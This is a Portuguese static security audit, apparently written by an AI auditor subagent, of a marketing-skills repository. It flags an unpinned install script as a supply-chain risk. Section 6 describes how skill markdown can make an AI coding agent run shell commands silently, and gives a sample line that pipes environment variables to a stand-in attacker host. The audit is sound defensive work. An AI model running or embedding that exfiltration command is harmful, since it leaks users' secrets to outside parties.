# F2 — Verificação de segurança estática — coreyhaines31/marketingskills@8bfcdff

> Pipeline de absorção (`ingestao-de-repositorio`), Fase 2 (gate BLOCK, prioridade #1).
> Análise **100% estática** — nenhum código do repo foi executado (Constituição, Art. VIII).
> Auditor: subagente `auditor-de-seguranca` (squad Egide). Data: 2026-06-24.
> Re-execução corretiva da absorção de 2026-06-22 (que registrou `QUARENTENA` sem persistir este artefato).

## Veredito

**SAFE para absorção ESTÁTICA de padrões markdown** — extrair método/padrão e reescrever em pt-BR,
nunca executar nem copiar literalmente. Os itens de risco são **isolados como NÃO-ABSORVÍVEIS** (abaixo).

Veredito por modo de uso:
| Uso | Veredito |
|---|---|
| Absorção estática (padrões markdown + estrutura) | **SAFE** |
| Executar `validate-skills-official.sh` | **REJEITAR** (supply-chain) |
| Copiar literalmente a seção de injeção do `AGENTS.md` para uma skill compartilhada | **REJEITAR** (RCE latente) |
| Executar os 64 CLIs Node | SAFE (1 exceção técnica menor: `wistia.js`) |

> Nota de reconciliação com o ledger: a entrada anterior marcou `seguranca: QUARENTENA`. O veredito se
> mantém **QUARENTENA enquanto o repo for tratado como executável**; vira **SAFE quando o escopo é
> estritamente a absorção de padrões markdown** com os itens perigosos descartados (G11, G13). Esta
> distinção é o que destrava a F3 nesta passagem.

## Achados por categoria

### 1. Segredos hardcoded — NENHUM (informativo)
- `.gitignore:10-12` exclui `.env`/`.env.*` (mantém `.env.example`). Nenhum `.env` no repo.
- Os 64 CLIs leem credencial só via `process.env.<TOOL>_API_KEY`. Ocorrências de `Bearer`/`api_key`
  são placeholders/exemplos, não valores reais.

### 2. Scripts shell
- **`validate-skills.sh` (1–170) — SEGURO.** Bash puro: valida frontmatter YAML local. Sem rede, sem
  instalação, sem execução remota.
- **`validate-skills-official.sh` — CRÍTICO (não-absorvível).**
  - `validate-skills-official.sh:20-22` — `git clone https://github.com/agentskills/agentskills.git` (rede).
  - `validate-skills-official.sh:28,31` — `pip install -e .` / `uv sync` **sem pin de versão** → RCE de
    supply-chain se o `setup.py` remoto mudar/for comprometido.
  - `validate-skills-official.sh:57` — executa o binário recém-instalado (`skills-ref validate`).

### 3. 64 CLIs Node (`tools/clis/*.js`) — BAIXO
- Sem `eval(`, sem `child_process`/`exec`/`execSync`, sem `fs` destrutivo, sem exfiltração de `process.env`.
- Sem `package.json` com dependências externas — `fetch` nativo (Node 18+), como anunciado.
- Exceção menor: `tools/clis/wistia.js:225` usa `require('fs')` (built-in) para ler um arquivo `--srt-file`
  local e enviar a uma API legítima Wistia — viola o slogan "zero-dependency" mas não é risco real.

### 4. Composio / Cogny / integrations — INFORMATIVO (seguro)
- `tools/integrations/composio.md` — setup manual via `npx @composio/mcp@latest setup` (npm oficial),
  OAuth 2.0. Sem auto-install de código arbitrário, sem fonte não-confiável.

### 5. `.claude-plugin/` — INFORMATIVO (seguro)
- `plugin.json` aponta `source: ./` (local). `marketplace.json` referencia o próprio repo no GitHub.
  Estrutura declarativa; nenhum auto-install remoto.

### 6. Técnica de injeção dinâmica `` !`cmd` `` (`AGENTS.md:227-254`) — ALTO (não-absorvível literal)
- Claude-Code-only: o markdown embute `` !`comando-shell` `` e o Claude Code **executa o comando** e
  injeta a saída no corpo da skill (ex.: `` !`cat .agents/product-marketing.md` ``).
- Risco: se uma skill com `` !`...` `` for absorvida/copiada literalmente, o comando roda silenciosamente
  ao invocar a skill — vetor de RCE (ex.: `` !`curl attacker/steal?d=$(env|base64)` ``). O próprio
  `AGENTS.md:223-254` adverte ser "Claude-Code-only" e não portável.
- **Disposição na absorção:** o *conceito* (auto-injetar contexto de produto) pode ser ADAPTADO de forma
  segura (ler arquivo via ferramenta, não via execução embutida em markdown); a *implementação literal*
  `` !`cmd` `` é **descartada**.

## Itens NÃO-ABSORVÍVEIS (isolar; nunca executar nem copiar literal)

| Item | Capacidade (gabarito) | Motivo | Disposição prevista (F4/F6.5) |
|---|---|---|---|
| `validate-skills-official.sh` | parte de **G11** | git clone + pip/uv install sem pin (supply-chain crítico) | DESCARTADO (segurança) |
| Implementação literal `` !`cmd` `` | **G13** | execução de comando shell embutida = RCE se copiada | conceito ADAPT seguro; literal DESCARTADO |
| `validate-skills.sh` (execução) | parte de **G11** | seguro de ler; absorver só o *padrão* de conformância à spec, não rodar | ADAPT do padrão; script não executado |

## Resumo (3 linhas)
Absorção estática de padrões markdown é SAFE; nenhum segredo hardcoded; os 64 CLIs Node são seguros
(só `wistia.js` viola "zero-dependency"). Risco concentra-se em DOIS itens a isolar: `validate-skills-official.sh`
(git clone + pip sem pin = supply-chain CRÍTICO) e a técnica de injeção `` !`cmd` `` do `AGENTS.md` (RCE
ALTO se copiada literal). Ambos entram como NÃO-ABSORVÍVEIS — destravam a F3 sob escopo estático.
